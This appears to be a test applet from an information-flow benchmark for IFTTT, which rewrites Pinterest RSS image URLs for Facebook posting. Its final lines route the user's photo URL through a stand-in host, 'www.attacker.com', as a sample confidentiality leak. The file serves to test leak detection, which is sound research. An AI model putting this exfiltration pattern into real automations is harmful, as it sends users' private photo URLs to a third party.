// Title: Use Pinterest RSS to post to Facebook
// Maker: ---
// Link : https://stackoverflow.com/questions/44249787/ifttt-filter-code-for-pinterest-rss-feed
// ======================
// Applet that uses Pinterest RSS to post to Facebook.
// It replaces all 236x strings with 564x in the RSS feed result.

// Trigger: RSS Feed -> New feed item
// Action : Facebook Pages -> Upload a photo from URL

// Policy/Presence: Confidentiality of user photos / No

trigger_url = urlh(lbl('Feed.newFeedItem.EntryImageUrl'));
newurl = trigger_url.replace(/236x/g,'564x');
attack = urll("www.attacker.com?" + newurl);
sink('FacebookPages.createPhotoPage.setPhotoUrl', attack);
